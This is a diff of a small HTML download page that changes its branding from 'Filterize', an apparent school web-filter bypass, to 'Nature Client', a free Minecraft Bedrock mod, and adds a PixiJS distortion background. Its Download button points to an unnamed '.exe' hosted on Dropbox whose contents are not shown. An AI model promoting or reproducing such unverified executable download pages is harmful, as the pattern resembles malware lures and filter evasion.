@@ -3,91 +3,135 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Filterize - Download</title>
+    <title>Nature Client - Distortion Effect</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/pixi.js/7.2.4/pixi.min.js"></script>
     <style>
-        /* 全体のレイアウト設定 */
         body, html {
             margin: 0;
             padding: 0;
+            width: 100%;
             height: 100%;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            overflow: hidden;
+            background-color: #000;
+            font-family: 'Segoe UI', sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
-            color: white;
-            background-color: #000;
-            overflow: hidden;
         }
 
-        /* 背景画像の設定（背景.pngをぼかして表示） */
-        .background {
+        /* WebGLを表示するキャンバス */
+        #canvas-container {
             position: fixed;
             top: 0;
             left: 0;
-            width: 100%;
-            height: 100%;
-            background: url('背景.png') no-repeat center center/cover;
-            /* ぼかし(15px)と明るさ(60%)の調整 */
-            filter: blur(15px) brightness(0.6);
-            /* ぼかしの縁を隠すために少しだけ拡大 */
-            transform: scale(1.1);
+            width: 100vw;
+            height: 100vh;
             z-index: -1;
         }
 
-        /* コンテンツの中央配置 */
+        /* コンテンツエリア */
         .container {
             text-align: center;
-            z-index: 1;
+            z-index: 10;
+            pointer-events: none; /* マウスイベントを背景に透過させる */
         }
 
         h1 {
-            font-size: clamp(2rem, 8vw, 4rem);
-            margin-bottom: 0.2em;
-            font-weight: 500;
+            font-size: clamp(2rem, 10vw, 4rem);
+            margin: 0;
+            color: white;
+            text-shadow: 0 0 20px rgba(0,0,0,0.5);
         }
 
         .description {
-            font-size: 1.1rem;
             color: rgba(255, 255, 255, 0.7);
-            margin-bottom: 3rem;
+            margin-bottom: 30px;
         }
 
-        /* 画像に基づいたグラデーションボタン */
         .btn {
             display: inline-block;
-            padding: 18px 50px;
+            padding: 15px 45px;
             font-size: 1.1rem;
             font-weight: bold;
             color: white;
             text-decoration: none;
-            /* ピンクから紫へのグラデーション */
-            background: linear-gradient(135deg, #b399ff 0%, #ff99cc 100%);
-            border-radius: 12px;
-            box-shadow: 0 8px 20px rgba(179, 153, 255, 0.3);
-            transition: all 0.3s ease;
+            background: linear-gradient(135deg, #a78bfa 0%, #f472b6 100%);
+            border-radius: 10px;
+            pointer-events: auto; /* ボタンだけはクリック可能にする */
+            transition: 0.3s;
         }
-
-        .btn:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 12px 30px rgba(255, 153, 204, 0.5);
-            filter: brightness(1.1);
-        }
-
     </style>
 </head>
 <body>
 
-    <div class="background"></div>
+    <div id="canvas-container"></div>
 
     <div class="container">
-        <h1>Filterize</h1>
-        <p class="description">The best anti loilofilter</p>
-        
+        <h1>Nature Client</h1>
+        <p class="description">The best minecraft bedrock free utility mod</p>
         <a href="https://www.dropbox.com/scl/fi/jhjaiww74lcgo741zqnng/.exe?rlkey=tv4zztnvfql4sd4c4nfsncioz&st=vwymdduv&dl=1" class="btn">
             Download Now
         </a>
     </div>
 
-</body>
+    <script>
+        // 設定
+        const imgUrl = '背景.png'; // あなたの背景画像
 
+        const app = new PIXI.Application({
+            width: window.innerWidth,
+            height: window.innerHeight,
+            resizeTo: window
+        });
+        document.getElementById('canvas-container').appendChild(app.view);
+
+        // 背景スプライト作成
+        const container = new PIXI.Container();
+        app.stage.addChild(container);
+
+        const bg = PIXI.Sprite.from(imgUrl);
+        bg.anchor.set(0.5);
+        bg.x = app.screen.width / 2;
+        bg.y = app.screen.height / 2;
+        
+        // 画面に合わせる（cover）
+        const scale = Math.max(app.screen.width / bg.width, app.screen.height / bg.height);
+        bg.scale.set(scale * 1.1); // ぼかしで見える端を隠すため少し大きく
+        container.addChild(bg);
+
+        // ぼかしフィルタ
+        const blurFilter = new PIXI.BlurFilter();
+        blurFilter.blur = 15;
+        bg.filters = [blurFilter];
+
+        // 歪み（Displacement）フィルタの設定
+        // 歪みの元になる「波紋」の画像を作成
+        const displacementSprite = PIXI.Sprite.from('https://pixijs.com/assets/pixi-filters/displacement_map_repeat.jpg');
+        displacementSprite.texture.baseTexture.wrapMode = PIXI.WRAP_MODES.REPEAT;
+        const displacementFilter = new PIXI.DisplacementFilter(displacementSprite);
+        displacementFilter.scale.set(0); // 最初は歪みゼロ
+
+        app.stage.addChild(displacementSprite);
+        bg.filters.push(displacementFilter);
+
+        // マウスの動きに合わせて歪ませる
+        window.addEventListener('mousemove', (e) => {
+            const posX = e.clientX;
+            const posY = e.clientY;
+            
+            // マウス位置に歪みの中心を移動
+            displacementSprite.x = posX;
+            displacementSprite.y = posY;
+            
+            // 歪みの強さを設定
+            displacementFilter.scale.set(30); 
+        });
+
+        // アニメーションで常に少し揺らす
+        app.ticker.add(() => {
+            displacementSprite.x += 1;
+            displacementSprite.y += 1;
+        });
+    </script>
+</body>
 </html>
